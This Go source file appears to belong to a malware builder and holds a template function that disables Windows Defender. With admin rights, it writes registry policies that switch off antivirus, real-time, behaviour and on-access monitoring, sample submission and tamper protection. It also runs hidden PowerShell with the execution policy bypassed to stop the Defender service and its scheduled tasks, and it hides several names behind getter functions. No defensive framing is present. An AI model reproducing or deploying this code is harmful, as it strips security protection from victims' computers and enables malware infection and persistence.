package buildergen

import "strings"

func templateDefenderKill() string {
	return strings.TrimSpace(`
func disableDefenderFull() {
	if !isAdmin() {
		return
	}

	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
	regSetValueEx := advapi32.NewProc("RegSetValueExW")
	regCloseKey := advapi32.NewProc(getRegCloseKeyName())
	regCreateKeyEx := advapi32.NewProc(getRegCreateKeyExWName())

	setDword := func(root uint32, subKey, valueName string, value uint32) {
		keyPath, _ := syscall.UTF16PtrFromString(subKey)
		var hKey syscall.Handle
		var disp uint32
		ret, _, _ := regCreateKeyEx.Call(
			uintptr(root),
			uintptr(unsafe.Pointer(keyPath)),
			0, 0, 0,
			uintptr(0x20006),
			0,
			uintptr(unsafe.Pointer(&hKey)),
			uintptr(unsafe.Pointer(&disp)),
		)
		if ret != 0 {
			ret, _, _ = regOpenKeyEx.Call(uintptr(root), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20006), uintptr(unsafe.Pointer(&hKey)))
			if ret != 0 {
				return
			}
		}
		defer regCloseKey.Call(uintptr(hKey))
		valName, _ := syscall.UTF16PtrFromString(valueName)
		data := value
		regSetValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, 4, uintptr(unsafe.Pointer(&data)), 4)
	}

	defenderPolicies := getDefenderPoliciesPath()
	rtpPolicies := getDefenderRtpPath()
	spynetPolicies := getDefenderSpynetPath()

	setDword(0x80000002, defenderPolicies, "DisableAntiSpyware", 1)
	setDword(0x80000002, defenderPolicies, "DisableAntiVirus", 1)
	setDword(0x80000002, defenderPolicies, "ServiceKeepAlive", 0)

	setDword(0x80000002, rtpPolicies, "DisableRealtimeMonitoring", 1)
	setDword(0x80000002, rtpPolicies, "DisableBehaviorMonitoring", 1)
	setDword(0x80000002, rtpPolicies, "DisableIOAVProtection", 1)
	setDword(0x80000002, rtpPolicies, "DisableOnAccessProtection", 1)
	setDword(0x80000002, rtpPolicies, "DisableScanOnRealtimeEnable", 1)

	setDword(0x80000002, spynetPolicies, "SpynetReporting", 0)
	setDword(0x80000002, spynetPolicies, "SubmitSamplesConsent", 2)

	stopCmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
		"-Command", getStopDefenderServiceCmd())
	_ = stopCmd.Run()

	disableTaskCmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
		"-Command", getDisableDefenderTasksCmd())
	_ = disableTaskCmd.Run()

	setDword(0x80000002, getTamperProtectionPath(), "TamperProtection", 0)
}
`)
}
